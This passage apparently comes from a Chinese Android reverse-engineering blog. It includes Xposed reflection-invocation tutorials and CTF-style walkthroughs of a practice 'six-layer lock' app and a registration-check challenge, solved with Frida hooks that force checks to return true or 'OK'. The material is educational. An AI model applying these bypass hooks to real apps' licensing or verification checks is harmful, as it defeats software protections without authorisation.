<li>调用成功，需要注意的是在调用private函数的时候注意要取消权限检查</li>
</ul>
<h4 id="主动调用非静态函数"><a href="#主动调用非静态函数" class="headerlink" title="主动调用非静态函数"></a>主动调用非静态函数</h4><p>目标app的两个非静态函数</p>
<img src="/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/image-20231214230357692.png" class="" title="image-20231214230357692">

<p>同样使用java反射的方式来调用</p>
<p>对于类的非静态函数，需要先创建类的实例然后通过实例来调用非静态方法</p>
<pre><code class="java">Method publicFunc_method = StuClass.getDeclaredMethod("publicFunc", String.class, int.class);
</code></pre>
<ul>
<li>获取静态方法</li>
</ul>
<pre><code class="java">//            public Student(String name, String id){
//                this.name = name;
//                this.id = id;
//            }
Constructor StuCon = StuClass.getDeclaredConstructor(String.class, String.class);
Object StuObj = StuCon.newInstance("InstanceByXposed", "3000");
</code></pre>
<ul>
<li>使用反射获取构造函数，然后通过<code>newInstance</code>方法创建一个类的实例，传入构造函数所需要的参数</li>
</ul>
<pre><code class="java">publicFunc_method.invoke(StuObj, "publicFuncinvokeedByLSPosed", 1111);
</code></pre>
<ul>
<li>然后通过这个实例来调用非静态方法</li>
</ul>
<img src="/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/image-20231214233611296.png" class="" title="image-20231214233611296">

<ul>
<li>分别调用了公有的和私有的非静态方法</li>
<li>调用私有的非静态方法还是需要注意要取消权限检查</li>
<li>另外函数的返回值也是可以在这里打印出来的</li>
</ul>
<h3 id="通过Xposed自带的方法进行主动调用"><a href="#通过Xposed自带的方法进行主动调用" class="headerlink" title="通过Xposed自带的方法进行主动调用"></a>通过Xposed自带的方法进行主动调用</h3><img src="/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/image-20231215161906843.png" class="" title="image-20231215161906843">

<ul>
<li><p>Xposed提供了两组方法来进行主动调用：第一种用于非静态函数调用第二种用于静态函数调用</p>
</li>
<li><p>这两种调用方式的参数略有不同：其中一种调用方式传参方式需要传入参数类型数组，另一种调用方式不需要传入，调用结果没有什么区别</p>
</li>
</ul>
<h4 id="查看源码的实现"><a href="#查看源码的实现" class="headerlink" title="查看源码的实现"></a>查看源码的实现</h4><p><code>callStaticMethod</code></p>
<img src="/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/image-20231215185940420.png" class="" title="image-20231215185940420">

<p><code>callMethod</code></p>
<img src="/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/image-20231215191502108.png" class="" title="image-20231215191502108">

<ul>
<li>可以看到这两个函数都有两种传参方式</li>
<li>在函数内部最终都调用了<code>findMethodBestMatch</code></li>
</ul>
<p><code>findMethodBestMatch</code></p>
<img src="/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/image-20231215193806442.png" class="" title="image-20231215193806442">

<ul>
<li>三个参数的会根据我们传入的参数类型，在内部调用<code>getParameterTypes</code>帮我们生成类型数组</li>
</ul>
<img src="/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/image-20231215191024955.png" class="" title="image-20231215191024955">

<ul>
<li>这段方法的作用也在源码的注释中写的很清楚<em>Look up a method in a class and set it to accessible</em>，在函数的内部调用了<code>setAccessible</code>来取消权限检查，所以我们就不需要再写取消的代码了</li>
<li>这里可以看到不论是三个参数还是四个参数的<code>findMethodBestMatch</code>最终都是调用了三个参数的<code>findMethodBestMatch</code></li>
</ul>
<h4 id="Xposed主动调用静态-x2F-非静态函数"><a href="#Xposed主动调用静态-x2F-非静态函数" class="headerlink" title="Xposed主动调用静态/非静态函数"></a>Xposed主动调用静态/非静态函数</h4><img src="/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/image-20231215204743050.png" class="" title="image-20231215204743050">

<ul>
<li>所以在这里我们只需要传入三个参数就可以了</li>
<li>都成功调用了，对静态和非静态函数的调用方式基本是相同的</li>
</ul>
<h4 id="调用已经有实例的类函数"><a href="#调用已经有实例的类函数" class="headerlink" title="调用已经有实例的类函数"></a>调用已经有实例的类函数</h4><img src="/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/image-20231215205112766.png" class="" title="image-20231215205112766">

<ul>
<li><p>比如这些已经有实例的函数</p>
<blockquote>
<ol>
<li><p>对构造函数进行hook，得到类的实例然后完成调用</p>
<pre><code class="java">//            Student cStudent = new Student("xiaohua", "2023");
            XposedHelpers.findAndHookConstructor(StuClass, String.class, String.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    super.beforeHookedMethod(param);
                    XposedBridge.log("beforeHookedMethod-&gt;" + "name: " + param.args[0] + "---" + "id: " + param.args[1]);
                }

                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    super.afterHookedMethod(param);
                    Object cStudent = param.thisObject;
                    XposedHelpers.callMethod(cStudent,  "publicFunc", "publicFuncInvokeByLSPosed", 5050);
                    XposedHelpers.callMethod(cStudent, "privateFunc", "privateFuncInvokeByLSPosed", 6060);
                }
            });
</code></pre>
</li>
<li><p>通过对类中非静态函数的hook，在这个非静态函数被调用的时候，拿到这个类的实例去完成调用</p>
<pre><code class="java">//            public String getNickname() {
//                return nickname;
//            }
            XposedHelpers.findAndHookMethod(StuClass, "getNickname", new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    super.beforeHookedMethod(param);
                    Object obj=param.thisObject;
                    XposedHelpers.callMethod(obj,"publicFunc","beforeHookedMethod publicfunc is called XposedHelpers.callMethod",444);
                    XposedHelpers.callMethod(obj,"privateFunc","beforeHookedMethod privatefunc is called XposedHelpers.callMethod",333);
   
                    XposedBridge.log("getNickname is called beforeHookedMethod-&gt;"+obj);
                }
   
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    super.afterHookedMethod(param);
                    Object obj=param.thisObject;
                    XposedHelpers.callMethod(obj,"publicFunc","afterHookedMethod publicfunc is called XposedHelpers.callMethod",222);
                    XposedHelpers.callMethod(obj,"privateFunc","afterHookedMethod privatefunc is called XposedHelpers.callMethod",111);
   
                    XposedBridge.log("getNickname is called afterHookedMethod-&gt;"+param.thisObject);
                }
            });
</code></pre>
</li>
</ol>
</blockquote>
</li>
</ul>
<p>执行结果</p>
<img src="/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/image-20231215215647019.png" class="" title="image-20231215215647019">



<p>总结：</p>
<blockquote>
<p>对于类中的静态函数，直接调用即可</p>
<p>对于非静态函数，需要先得到类的实例，然后才能完成调用</p>
</blockquote>
<p>附件：</p>
<p><a href="https://github.com/xiaoeeyu/Xposed01/blob/master/app/src/main/java/com/xiaoeryu/xposed01/HookActiveInvoke.java">HookActiveInvoke</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Xposed插件开发</tag>
      </tags>
  </entry>
  <entry>
    <title>六层锁机</title>
    <url>/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/</url>
    <content><![CDATA[<p>六层锁机和一个注册机制绕过，这个六层锁机之前分析过有些关卡没过，这里重新分析一遍</p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><blockquote>
<p>Android 13.0</p>
<p>frida 16.1.8</p>
</blockquote>
<h3 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h3><img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240725114737781.png" class="" title="image-20240725114737781">

<p>用jadx打开apk</p>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240725115240692.png" class="" title="image-20240725115240692">

<ul>
<li><p>登陆页面的逻辑是把拿到的<strong>username</strong>放入<code>a</code>中，计算出来的结果需要相同</p>
</li>
<li><p><code>a</code>是<strong>HmacSHA256</strong>加密函数</p>
</li>
<li><p>密码是通过<code>a</code>传入<strong>username</strong>计算出来的。所以可以通过获取<code>a</code>的返回值来拿到</p>
<blockquote>
<p>有三种方式可以获取：</p>
<ol>
<li><p>提取出来算法，计算出返回值</p>
<pre><code class="java">import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;

public class PasswordGenerator {
    public static void main(String[] args) {
        String username = "xiaoeryu"; // 用户名

        String password = generatePassword(username, username);
        System.out.println("Generated Password: " + password);
    }

    private static String generatePassword(String str, String str2) {
        try {
            SecretKeySpec secretKeySpec = new SecretKeySpec(str2.getBytes(StandardCharsets.UTF_8), "HmacSHA256");
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(secretKeySpec);
            return bytesToHex(mac.doFinal(str.getBytes(StandardCharsets.UTF_8)));
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            String hex = Integer.toHexString(0xff &amp; b);
            if (hex.length() == 1)
                sb.append('0');
            sb.append(hex);
        }
        return sb.toString();
    }
}
</code></pre>
</li>
<li><p>使用objection来hook <code>a</code>函数拿到返回值</p>
<p><code>android hooking search classes Activity</code></p>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240725141631181.png" class="" title="image-20240725141631181">
</li>
<li><p>写frida hook脚本来获取返回值：hook起来比较简单就是一个静态函数</p>
<pre><code class="js">Java.perform(function() {
    var LoginActivity = Java.use('com.example.androiddemo.Activity.LoginActivity');
   
    LoginActivity.a.overload('java.lang.String', 'java.lang.String').implementation = function(arg1, arg2) {
        var result = this.a(arg1, arg2);
        console.log('Arguments: ' + arg1 + ', ' + arg2);
        console.log('Result: ' + result);
        return result;
    };
});
</code></pre>
</li>
</ol>
</blockquote>
</li>
</ul>
<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>登录后的第一关</p>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240725165613394.png" class="" title="image-20240725165613394">

<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240725171315169-17218987967391.png" class="" title="image-20240725171315169">

<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240726205832838.png" class="" title="image-20240726205832838">

<ul>
<li>这一关可以不需要关心算法细节，只需要hook <code>a</code>函数，让它返回<code>R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL=</code>即可</li>
</ul>
<p>hook <code>a</code>方法修改返回值：依旧是一个静态函数</p>
<pre><code class="js">Java.perform(function () {
    try {
        var FridaActivity1 = Java.use("com.example.androiddemo.Activity.FridaActivity1");

        // 确认类是否成功加载
        if (FridaActivity1) {
            console.log("Successfully loaded FridaActivity1 class.");
        }

        // Hook the method with byte array as the parameter
        FridaActivity1.a.overload('[B').implementation = function (byteArray) {
            console.log("Hooked a(byte[]) method in FridaActivity1. Returning pre-defined value.");
            return "R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL=";
        };
    } catch (e) {
        console.log("Exception: " + e.message);
    }
});
</code></pre>
<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240725190223024.png" class="" title="image-20240725190223024">

<ul>
<li><p>第二关只要让两个变量都为<code>true</code>就可以了</p>
<blockquote>
<p>static_bool_var：是一个静态变量直接设置就可以</p>
<p>bool_var：是一个实例变量，需要查找类下的所有实例变量然后再设置</p>
</blockquote>
</li>
</ul>
<pre><code class="js">Java.perform(function () {
    function Activity2() {
        var FridaActivity2 = Java.use("com.example.androiddemo.Activity.FridaActivity2");
        // 直接设置静态变量
        FridaActivity2.static_bool_var.value = true;
        // 查找活动实例并设置实例变量
        Java.choose("com.example.androiddemo.Activity.FridaActivity2", {
            onMatch: function (ins) {
                // 直接设置实例变量
                ins.bool_var.value = true;
                console.log("Instance found and bool_var set to true");
            },
            onComplete: function () {
                console.log("Java.choose completed");
            }
        });
    }
    Activity2()
});
</code></pre>
<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>第三层锁机在第二层的基础上有一些改变，如下图</p>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240725210524640.png" class="" title="image-20240725210524640">

<ul>
<li>这里跟之前两关差不多，区别在于有一个变量名和函数名相同</li>
</ul>
<pre><code class="js">Java.perform(function () {
    function Activity3() {
        var FridaActivity3 = Java.use("com.example.androiddemo.Activity.FridaActivity3");
        var BooleanClass = Java.use("java.lang.Boolean");
        // 直接设置静态变量
        FridaActivity3.static_bool_var.value = true;
        // 查找活动实例并设置实例变量
        Java.choose("com.example.androiddemo.Activity.FridaActivity3", {
            onMatch: function (ins) {
                // 直接设置实例变量
                ins.bool_var.value = true;
                // 需要在重名的变量前加一个下划线
                ins._same_name_bool_var.value = true;

                console.log("Instance found and bool_var &amp; same_name_bool_var set to true");
            },
            onComplete: function () {
                console.log("Java.choose completed");
            }
        });
    }

    Activity3()
});
</code></pre>
<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240725222606648.png" class="" title="image-20240725222606648">

<ul>
<li>这里的主要问题是要修改内部类中方法的返回值</li>
</ul>
<p>有两种方案可以解决</p>
<blockquote>
<p>第一种：依次进行hook</p>
<p>第二种：通过反射拿到内部类的所有方法，然后hook并返回true</p>
</blockquote>
<pre><code class="js">Java.perform(function () {
    // function forth() {
    //     var InnerClasses = Java.use("com.example.androiddemo.Activity.FridaActivity4$InnerClasses");

    //     // 将 check1 到 check6 方法的返回值修改为 true
    //     InnerClasses.check1.implementation = function () {
    //         console.log("check1 called");
    //         return true;
    //     };

    //     InnerClasses.check2.implementation = function () {
    //         console.log("check2 called");
    //         return true;
    //     };

    //     InnerClasses.check3.implementation = function () {
    //         console.log("check3 called");
    //         return true;
    //     };

    //     InnerClasses.check4.implementation = function () {
    //         console.log("check4 called");
    //         return true;
    //     };

    //     InnerClasses.check5.implementation = function () {
    //         console.log("check5 called");
    //         return true;
    //     };

    //     InnerClasses.check6.implementation = function () {
    //         console.log("check6 called");
    //         return true;
    //     };

    //     console.log("All check methods modified to return true");
    // }
    function forth2() {
        var class_name = "com.example.androiddemo.Activity.FridaActivity4$InnerClasses";
        var InnerClass = Java.use(class_name);
        var all_methods = InnerClass.class.getDeclaredMethods();
        //console.log(all_methods);
        for (var i = 0; i &lt; all_methods.length; i++) {
            var method = all_methods[i];
            console.log(method);
            var substring = method.toString().substr(method.toString().indexOf(class_name) + class_name.length + 1);
            //console.log(substring);
            var finalMethodString = substring.substr(0, substring.indexOf("("));
            console.log(finalMethodString);
            InnerClass[finalMethodString].implementation = function () { return true };
        }
    }

    // forth2()
    forth2()
});
</code></pre>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240726110826385.png" class="" title="image-20240726110826385">

<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240725225633237.png" class="" title="image-20240725225633237">

<ul>
<li>继续跟进<code>getDynamicDexCheck </code>函数中</li>
</ul>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240726113424556.png" class="" title="image-20240726113424556">

<ul>
<li>继续跟进<code>loaddex</code>函数中</li>
</ul>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240726113607782.png" class="" title="image-20240726113607782">

<ul>
<li>此处动态加载Dex是用<code>DexClassLoader</code>加载的</li>
</ul>
<pre><code class="js">Java.perform(function(){
    function fifth(){
        // var methods = Java.enumerateMethods("*!check")
        // console.log(JSON.stringify(methods,null,2))
        Java.enumerateClassLoaders({
            onMatch: function (loader) {
                try {
                    if (loader.findClass("com.example.androiddemo.Dynamic.DynamicCheck")) {
        
                        Java.classFactory.loader = loader;
        
                    }
                }
                catch (error) {
                    console.log(" continuing :" + error)
                }
            },
            onComplete: function () {
                console.log("EnumerateClassloader END")
            }
        })
        Java.use("com.example.androiddemo.Dynamic.DynamicCheck").check.implementation = function(){
            return true;
        }
    }
    fifth()
})
</code></pre>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240726165103754.png" class="" title="image-20240726165103754">



<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240725225841360.png" class="" title="image-20240725225841360">

<p>这一关比较简单：直接hook这几个类中的<code>check</code>方法，修改返回值即可</p>
<pre><code class="js">Java.perform(function () {
    function sixth() {
        var targetClasses = [
            'com.example.androiddemo.Activity.Frida6.Frida6Class0',
            'com.example.androiddemo.Activity.Frida6.Frida6Class1',
            'com.example.androiddemo.Activity.Frida6.Frida6Class2'
        ]
        targetClasses.forEach(function (className) {
            var targetClasses = Java.use(className)
            targetClasses.check.implementation = function () {
                console.log(className + "check called")
                return true
            }
        })
    }
    sixth()
})
</code></pre>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240726173418605.png" class="" title="image-20240726173418605">

<hr>
<h2 id="注册机绕过"><a href="#注册机绕过" class="headerlink" title="注册机绕过"></a>注册机绕过</h2><img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240726175855698.png" class="" title="image-20240726175855698">

<h6 id="该App程序使用了机器码验证，想办法绕过机器码验证，以便正常使用该App功能。绕过后，随意输入账号密码，将获得flag"><a href="#该App程序使用了机器码验证，想办法绕过机器码验证，以便正常使用该App功能。绕过后，随意输入账号密码，将获得flag" class="headerlink" title="该App程序使用了机器码验证，想办法绕过机器码验证，以便正常使用该App功能。绕过后，随意输入账号密码，将获得flag"></a>该App程序使用了机器码验证，想办法绕过机器码验证，以便正常使用该App功能。绕过后，随意输入账号密码，将获得flag</h6><p>用jadx打开apk在登陆页面定位到登陆按钮点击事件</p>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240726183933825.png" class="" title="image-20240726183933825">

<ul>
<li>这里通过ID判断是否是登陆按钮，进入之后开始处理<code>mWaittimer</code>的逻辑</li>
<li>创建一个新的<code>Timer</code>对象，并创建一个<code>MyWaitTimerTask</code>对象</li>
</ul>
<p>跟进去看一下</p>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240726191107288.png" class="" title="image-20240726191107288">

<ul>
<li>第一块框出来的这块代码可以看到对URL和获取到的一些设备信息进行了校验</li>
<li>框出来的第二块是校验返回的结果如果是<code>OK</code>，则设置<code>netcom.m_check</code>为1，发送一个消息，设置<code>what</code>为<code>2001</code>，表示成功</li>
<li>所以，接下来可以考虑hook <code>CheckUrl</code>函数让其返回<code>OK</code></li>
</ul>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240726191726752.png" class="" title="image-20240726191726752">

<p>这个hook起来比较简单，就是一个静态函数</p>
<pre><code class="js">function main(){
    Java.perform(function(){
        var netcom = Java.use("com.netcom.netcom")
        netcom["CheckUrl"].implementation = function(url){
            return Java.use("java.lang.String").$new("OK")
        }
    })
}
setImmediate(main)
</code></pre>
<p>执行脚本后，输入或者不输入内容都会显示flag</p>
<img src="/2024/07/29/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA/image-20240729104155952.png" class="" title="image-20240729104155952">
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>六层锁机分析</title>
    <url>/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>本章来通过一个案例更深层次的去了解frida，在各种情境下怎么去修改函数的返回值</p>
<span id="more"></span>

<hr>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231119092257350.png" class="" title="image-20231119092257350">

<p><strong>先使用objection大致了解一下apk</strong></p>
<p>objection附加到app</p>
<p><code>objection -g com.example.androiddemo explore</code></p>
<p>先看一下它的activity</p>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231120224918546.png" class="" title="image-20231120224918546">

<ul>
<li>这个Activity都能直接跳过登陆界面跳过去，这种直接能跳过登陆界面的在现在的app上基本都不存在了。</li>
</ul>
<p>接下来开始按正常流程开始分析</p>
<h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231120225856239.png" class="" title="image-20231120225856239">

<ul>
<li>点击<code>SIGN IN</code>按钮会有一个<em>Login failed</em>的Toast</li>
</ul>
<p>接下来用jadx打开apk搜索这个字符串</p>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231120230102805.png" class="" title="image-20231120230102805">

<p>进入</p>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231120232340333.png" class="" title="image-20231120232340333">

<ul>
<li>这里调用<code>a方法</code>传入了两个相同的<em>obj</em>然后将返回的结果与<em>obj2</em>作比较</li>
<li>接下来查看这个两个str参数的重载<code>a方法</code></li>
<li>hook这个a方法拿到返回的结果输入比较一下</li>
</ul>
<h3 id="写hook脚本拿到a-的返回结果"><a href="#写hook脚本拿到a-的返回结果" class="headerlink" title="写hook脚本拿到a()的返回结果"></a>写hook脚本拿到a()的返回结果</h3><pre><code class="js">function main(){
    Java.perform(function(){
        Java.use("com.example.androiddemo.Activity.LoginActivity").a.overload('java.lang.String', 'java.lang.String').implementation = function(x, y){
            var result = this.a(x, y);
            console.log("x, y, result", x, y, result);
            return result;
        }
    })
}
setImmediate(main)
</code></pre>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121161826092.png" class="" title="image-20231121161826092">

<ul>
<li><p>将result的值粘贴进去试一下（使用<code>input</code>命令也可以粘贴进去）</p>
<blockquote>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121162253596.png" class="" title="image-20231121162253596"></blockquote>
</li>
</ul>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121162047633.png" class="" title="image-20231121162047633">

<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121162420767.png" class="" title="image-20231121162420767">



<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121163357336.png" class="" title="image-20231121163357336">

<ul>
<li>点击屏幕上的按钮有<strong>Check Failed</strong>的弹窗，跟前面一样搜索这个弹窗</li>
</ul>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121164503598.png" class="" title="image-20231121164503598">

<ul>
<li>发现这里有个<code>CheckSuccess()</code>按X查找它的用例</li>
</ul>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121164630724.png" class="" title="image-20231121164630724">

<p>看第一关的用例</p>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121170030394.png" class="" title="image-20231121170030394">

<ul>
<li>这里只要修改<code>a方法</code>的返回值就可以通过了</li>
</ul>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121170134756.png" class="" title="image-20231121170134756">

<ul>
<li>用这个脚本hook这个类中的<code>a方法</code>让返回值等于<code>R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL=</code>就通过了</li>
</ul>
<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121170402762.png" class="" title="image-20231121170402762">

<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121180613623.png" class="" title="image-20231121180613623">

<ul>
<li><p>第二关只需要这两个返回值为<code>true</code>就通过了</p>
</li>
<li><p>这两个方法一个是静态一个是动态</p>
<blockquote>
<p>静态直接调用就可以了</p>
<p>动态需要找到实例才能调用</p>
</blockquote>
</li>
</ul>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121182030877.png" class="" title="image-20231121182030877">

<ul>
<li>写完直接保存一下，或者重新运行一下。这样就通过了</li>
</ul>
<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121204152860.png" class="" title="image-20231121204152860">

<ul>
<li><p>修改这三个变量为<code>true</code>就通过</p>
<blockquote>
<p>第一个变量为静态布尔类型</p>
<p>第二个变量为动态布尔类型</p>
<p>第三个为同名布尔变量</p>
</blockquote>
</li>
</ul>
<h6 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h6><pre><code class="js">function third(){
    Java.perform(function(){
        Java.use("com.example.androiddemo.Activity.FridaActivity3").static_bool_var.value = true;
        Java.choose("com.example.androiddemo.Activity.FridaActivity3", {
            onMatch:function(instance){
                console.log("found instance: ", instance);
                instance.bool_var.value = true;
                instance._same_name_bool_var.value = true;
            }, onComplete:function(){}
        })
    })
}
</code></pre>
<ul>
<li>注意修改同名变量的时候要在变量名前面加上下划线，不然会修改失败</li>
</ul>
<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121211304463.png" class="" title="image-20231121211304463">

<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121211545411.png" class="" title="image-20231121211545411">

<ul>
<li>这里我们看怎么修改静态内部类中静态函数的返回值为<code>true</code></li>
</ul>
<h6 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h6><pre><code class="js">function fourth(){
    Java.perform(function(){
        Java.use("com.example.androiddemo.Activity.FridaActivity4$InnerClasses").check1.implementation = function(){return true};
        Java.use("com.example.androiddemo.Activity.FridaActivity4$InnerClasses").check2.implementation = function(){return true};
        Java.use("com.example.androiddemo.Activity.FridaActivity4$InnerClasses").check3.implementation = function(){return true};
        Java.use("com.example.androiddemo.Activity.FridaActivity4$InnerClasses").check4.implementation = function(){return true};
        Java.use("com.example.androiddemo.Activity.FridaActivity4$InnerClasses").check5.implementation = function(){return true};
        Java.use("com.example.androiddemo.Activity.FridaActivity4$InnerClasses").check6.implementation = function(){return true};
    })
}
</code></pre>
<ul>
<li><p>这样我们就可以通过验证进入下一关</p>
</li>
<li><p>但是这里有一个点需要注意一下</p>
<blockquote>
<p>怎么准确的拿到这个类名：</p>
<p>可以通过<code>objection</code>去附加然后搜索拿到准确的类名</p>
<img src="/2023/11/22/%E5%85%AD%E5%B1%82%E9%94%81%E6%9C%BA%E5%88%86%E6%9E%90/image-20231121214703168.png" class="" title="image-20231121214703168">
</blockquote>
</li>
<li><p>另外就是像这种需要修改多个返回值的，一个一个修改如果量太多是比较麻烦的。所以可以通过java的反射来枚举所有的方法去修改<em>（反射机制允许在运行时动态获取和使用类的信息，包括类的字段、方法、构造函数等）</em></p>
</li>
</ul>
<h6 id="通过枚举的方式批量修改返回值脚本"><a href="#通过枚举的方式批量修改返回值脚本" class="headerlink" title="通过枚举的方式批量修改返回值脚本"></a>通过枚举的方式批量修改返回值脚本</h6><pre><code class="js">function fourth_2() {
    Java.perform(function () {
        var innerClass = Java.use("com.example.androiddemo.Activity.FridaActivity4$InnerClasses");

        // 获取内部类的所有方法
        var methods = innerClass.class.getDeclaredMethods();

        // 遍历方法数组
        for (var i = 0; i &lt; methods.length; i++) {
